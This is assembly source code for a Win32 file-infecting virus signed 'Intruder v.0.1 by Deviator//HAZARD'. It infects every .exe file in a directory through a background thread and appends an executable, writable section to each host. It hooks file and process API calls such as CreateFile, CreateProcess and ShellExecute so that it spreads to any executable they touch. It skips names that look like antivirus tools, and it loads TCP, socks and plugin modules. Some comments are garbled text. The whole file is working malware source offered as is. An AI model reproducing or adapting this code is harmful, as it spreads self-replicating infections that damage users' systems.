   .386p
   .model flat,stdcall
   include win32.inc

   iver1   =   0       ; High byte version and low byte version
   iver2   =   2
   xVic    =   4096
   maxplug =   25      ; Maximum number of plugins

   antih   =   1

   .data
   main:
   if  antih
       mov esp,[esp][8]
       pop 4 ptr fs:[0]
       pop eax
   endif

   hEntry:
       push    offset Host
   oldh    equ $ - 4

       Call    GetBp               ; „¥«ìâ 
   GetBp:  pop ebp
       sub ebp,offset GetBp

       mov edi,offset old5
   oldpos  equ $ - 4               ; ‚®ááâ  ¢«¨¢ ¥¬ ®á¨â¥«ì
       lea esi,[old5][ebp]
       mov ecx,xVic
       cld
   rep movsb

       Call    ApiInit             ; Search Kernel32

       xchg    eax,edx
       lea esi,[nf1][ebp]
       lea edi,[CreateFile][ebp]       ; * ç¨ ¥¬ ¨¬¯®àâ¨à®¢ âì
       mov ecx,imnum           ; ã¦ë¥  ¬ äãªæ¨¨
   Import: push    ecx
       push    edi
       mov edi,esi
       mov al,0
   f0: scasb
       jnz f0
       mov edx,edi             ; * áç¨â ¥¬ ¤«¨ã
       sub edx,esi
       dec edx
       dec edx
       xchg    edi,esi
       push    esi
       Call    ImportApi           ; ˆ¬¯®àâ¨àã¥¬
       pop esi
       pop edi
       or  eax,eax
       pop ecx
       jz  jquit
       stosd
       loop    Import              ; *à®¤®«¦ ¥¬

   ;--- ‚á¥...¡®«ìèe  ¬ ¨ç¥£® ¥  ¤®
       lea edx,[sects][ebp]
       push    edx
       call    [GetSystemTime][ebp],edx    ; Randomize
       pop esi
       mov ecx,4
   PR: lodsd
       xor edx,eax
       rol edx,1
       loop    PR
       mov [rseed][ebp],edx

       inc [generation][ebp]

       Call    InfectDir

       comment ê
       lea eax,[cdir][ebp]
       Call    [GetCurrentDirectory][ebp],512,eax

       lea eax,[xdir][ebp]
       push    eax
       Call    [GetWindowsDirectory][ebp],eax,512
       pop eax
       Call    [SetCurrentDirectory][ebp],eax
       Call    InfectDir
       lea eax,[xdir][ebp]
       push    eax
       Call    [GetSystemDirectory][ebp],eax,512
       pop eax
       Call    [SetCurrentDirectory][ebp],eax
       Call    InfectDir

       lea eax,[cdir][ebp]
       Call    [SetCurrentDirectory][ebp],eax
       ê

       Call    InitTcpImports
       Call    LoadPlugins
   ;   Call    Install
       Call    TcpInstall

   jquit:  ret

       db  'Intruder v.0.1 by Deviator//HAZARD',0

   Install proc
       Call    InitIntercept
       mov ecx,IFuncl
       lea esi,[IFunc][ebp]
   InterceptIt:
       lodsd
       push    esi ecx
       push    esi
       xchg    eax,esi
       add esi,ebp
       push    esi
       xor edx,edx
   czx:    lodsb
       inc edx
       cmp al,0
       jnz czx
       dec edx
       dec edx
       pop esi
       Call    Intercept
       pop esi
       or  eax,eax
       jz  NoSuch
       push    eax
       lodsd
       add eax,ebp
       stosd
       lodsd
       add eax,ebp
       xchg    eax,edi
       pop eax
       sub eax,edi
       sub eax,4
       stosd
   NoSuch: pop ecx esi
       lodsd
       lodsd
       loop    InterceptIt
       ret
   Install endp
   ;-------------------------------------------------------------------
   MyCreateFile:
       pushad
           mov eax,[esp][36]           ; Name
           Call    DoInfect
       popad
           db  0E9h
   RealCreateFile  dd  ?

   ;-------------------------------------------------------------------
   MyCreateProcess:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad

               db  0E9h
   RealCreateProcess   dd  ?
   ;-------------------------------------------------------------------
   MySetCurrentDirectory:
       pushad

       Call    ClGetBp
   ClGetBp:pop ebp
       sub ebp,offset ClGetBp

       Call    InfectDir
       popad
               db  0E9h
   RealSetCurrentDirectory dd  ?
   ;-------------------------------------------------------------------
   MyOpenFile:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   RealOpenFile        dd  ?
   ;-------------------------------------------------------------------
   MyShellExecute:
       pushad
       mov eax,[esp][44]
       Call    DoInfect
       popad
               db  0E9h
   RealShellExecute    dd  ?
   ;-------------------------------------------------------------------
   MyCopyFile:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   RealCopyFile        dd  ?
   ;-------------------------------------------------------------------
   MyMoveFile:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   RealMoveFile        dd  ?
   ;-------------------------------------------------------------------
   MyGetFileAttributes:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   RealGetFileAttributes   dd  ?
   ;-------------------------------------------------------------------
   Mylcreat:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   Reallcreat      dd  ?
   ;-------------------------------------------------------------------
   Mylopen:
       pushad
       mov eax,[esp][36]
       Call    DoInfect
       popad
               db  0E9h
   Reallopen       dd  ?
   ;-------------------------------------------------------------------
   DoInfect        proc
       Call    CrGetBp
   CrGetBp:pop ebp
       sub ebp,offset CrGetBp

       mov [inloop][ebp],0

       mov esi,eax
   fdot:   lodsb
       cmp al,0
       jz  xNoInfect
       cmp al,'.'
       jnz fdot
       lodsw
       or  ax,2020h
       cmp ax,'xe'
       jnz xNoInfect
       lodsb
       or  al,20h
       cmp al,'e'
       jnz xNoInfect
       Call    InfectFile
   xNoInfect:
       ret
   DoInfect        endp
   ;---------------------------------------------
   InfectDir       proc
       cmp [inloop][ebp],0
       jnz InfectDir
       mov [inloop][ebp],1
       mov 4 ptr [DirEBP][ebp],ebp
       lea eax,[DirLoop][ebp]
       lea ebx,[free][ebp]
       Call    [CreateThread][ebp],0,8096,eax,0,0,ebx
       mov [inloop][ebp],0
       ret
   InfectDir   endp

   inloop  db  ?

   DirLoop proc
       mov ebp,12345678h
   DirEBP  equ $ - 4

       lea edx,[fmask][ebp]
       lea ecx,[FindData][ebp]
       Call    [FindFirstFile][ebp],edx,ecx    ; ˆé¥¬ ä ©«
       inc eax
       jz  AllFounded          ; *¥âã ¡®«ìè¥...
       dec eax
       mov [fhandle][ebp],eax
   ifile:  lea edx,[cFileName][ebp]
           Call    InfectFile
       mov edx,[fhandle][ebp]
       lea ecx,[FindData][ebp]
       Call    [FindNextFile][ebp],edx,ecx     ; ‘«¥¤ãîé¨© ä ©«
       or  eax,eax
       jnz ifile
       mov edx,[fhandle][ebp]
       Call    [FindClose][ebp],edx
   AllFounded:
       jmp [ExitThread][ebp]
   DirLoop endp

   include infect.inc

   CheckName   proc
       mov esi,edi
       lea edi,[body][ebp]
   findz:  lodsb
       push    eax
       or  al,20h
       stosb
       pop eax
       cmp al,0
       jnz findz

       lea esi,[bnames][ebp]
       lea edi,[body][ebp]
       mov ecx,bnamesn
   CheckNames:
       push    ecx edi
       mov ecx,ebx
       lodsw
   fxit:   cmp 1 ptr [edi],0
       jz  NextOne
       cmp [edi],ax
       jz  NameFounded
       inc edi
       jmp fxit
   NextOne:pop edi ecx
       loop    CheckNames
       clc
       ret
   NameFounded:
       stc
       pop edi ecx
       ret
   CheckName   endp

   generation  dd  51

   bnames  db  'av'
       db  'dr'
   bnamesn equ ($ - bnames) shr 1

   include api.inc
   include wsmm.inc
   include intapi.inc
   include tcp.inc
   include socks.inc
   include plugins.inc

   nf1:
   xF1 db  'CreateFileA',0         ; ˆ¬¯®àâ
       db  'ReadFile',0
       db  'WriteFile',0
       db  'CloseHandle',0
       db  'FindFirstFileA',0
       db  'FindNextFileA',0
       db  'FindClose',0
       db  'SetFilePointer',0
       db  'GetSystemTime',0
       db  'GetCurrentDirectoryA',0
       db  'GetWindowsDirectoryA',0
   xF3 db  'SetCurrentDirectoryA',0
   xF8 db  'GetFileAttributesA',0
       db  'SetFileAttributesA',0
       db  'GetSystemDirectoryA',0
       db  'CreateThread',0
       db  'ExitThread',0
       db  'LoadLibraryA',0
       db  'GetProcAddress',0
       db  'CreateProcessA',0
       db  'GetProcessVersion',0
       db  'DeleteFileA',0
       db  'GetVersionEx',0
       db  'GetLogicalDriveStringsA',0
       db  'GetDriveTypeA',0
       db  'VirtualAlloc',0
       db  'VirtualFree',0
       db  'VirtualLock',0
   ;---------------------------------
   xF2 db  'CreateProcessA',0
   xF4 db  'OpenFile',0
   xF5 db  'ShellExecuteA',0
   xF6 db  'CopyFileA',0
   xF7 db  'MoveFileA',0
   xF9 db  '_lcreat',0
   xF10    db  '_lopen',0

   IFunc   dd  offset xF1
       dd  offset MyCreateFile
       dd  offset RealCreateFile

       dd  offset xF2
       dd  offset MyCreateProcess
       dd  offset RealCreateProcess

       dd  offset xF3
       dd  offset MySetCurrentDirectory
       dd  offset RealSetCurrentDirectory

       dd  offset xF4
       dd  offset MyOpenFile
       dd  offset RealOpenFile

       dd  offset xF5
       dd  offset MyShellExecute
       dd  offset RealShellExecute

       dd  offset xF6
       dd  offset MyCopyFile
       dd  offset RealCopyFile

       dd  offset xF7
       dd  offset MyMoveFile
       dd  offset RealMoveFile

       dd  offset xF8
       dd  offset MyGetFileAttributes
       dd  offset RealGetFileAttributes

       dd  offset xF9
       dd  offset Mylcreat
       dd  offset Reallcreat

       dd  offset xF10
       dd  offset Mylopen
       dd  offset Reallopen
   IFuncl  equ ($-IFunc)/12

   mysec:
       db  '.edata',0,0            ; Section template
   mysze   dd  ?
   irva    dd  ?
   msize   dd  ?
   ipos    dd  ?
       db  0Ch dup (0)
       dd  80000000h or 40000000h or 20000000h or 40h
                    ; Exec/Read/Write/Initialised data section

   fmask   db  '*.exe',0

   include tcpinc.inc

   old5    db  xVic dup (0)        ; ¡ãää¥à ¤«ï ªãáª  ¦¥àâ¢ë

   vlen    equ $ - main
   ;---------------------------------------------------------------------
   ;---- My own API

   CreateFile      dd  ?
   ReadFile        dd  ?
   WriteFile       dd  ?
   CloseHandle     dd  ?
   FindFirstFile       dd  ?
   FindNextFile        dd  ?
   FindClose       dd  ?
   FSeek           dd  ?
   GetSystemTime       dd  ?
   GetCurrentDirectory dd  ?
   GetWindowsDirectory dd  ?
   SetCurrentDirectory dd  ?
   GetFileAttributes   dd  ?
   SetFileAttributes   dd  ?
   GetSystemDirectory  dd  ?
   CreateThread        dd  ?
   ExitThread      dd  ?
   LoadLibrary     dd  ?
   GetProcAddress      dd  ?
   CreateProcess       dd  ?
   GetProcessVersion   dd  ?
   DeleteFile      dd  ?
   GetVersionEx        dd  ?
   GetLogicalDriveStrings  dd  ?
   GetDriveType        dd  ?
   VirtualAlloc        dd  ?
   VirtualFree     dd  ?
   VirtualLock     dd  ?
   imnum   equ ($ - CreateFile) shr 2  ; Š®«¨ç¥áâ¢® ¨¬¯®àâ¨àã¥¬ëå äãªæ¨©

   include     wsmm.dat
   include     tcpdata.inc

   lthread dd  ?

   pnum    dd  ?
   plugins dd  maxplug dup (?)

   FindData    label
   dwFileAttributes    dd ?
   ftCreationTime      dq ?
   ftLastAccessTime    dq ?
   ftLastWriteTime     dq ?
   nFileSizeHigh       dd ?
   nFileSizeLow        dd ?
   dwReserved0     dd ?
   dwReserved1     dd ?
   cFileName       db MAX_PATH dup (?)
   cAlternateFileName  db 14 dup (?)
   ;-------------------
   cVir            dd  ?

   xdir            db  512 dup (?)
   cdir            db  512 dup (?)

   need            db  0F8h dup (?)
   tbls            db  2Ch dup (?)

   xtt         dd  ?

   free            dd  ?
   fhandle         dd  ?
   mpos            dd  ?
   mpox            dd  ?
   peh         dd  ?
   dclen           dd  ?
   fsec            dd  ?
   ecbody          dd  ?
   ;freetbl            db  2Ch dup (?)
   fattr           dd  ?

   sects   db  30*2Ch dup (?)

   body    db  vlen*2 dup (?)
   body2   db  vlen*2 dup (?)

   include     lzss.dat

   fvlen   equ $ - main
   ;-------------------------------------------------------------------------------
   .code                           ; Dummy Host
   extrn   ExitProcess:proc
   extrn   MessageBoxA:proc
   xFree   db  'Just a test !!!',0
   Host:   Call    MessageBoxA,0,offset xFree,offset xFree,0
       Call    ExitProcess,0
   end hEntry
   end
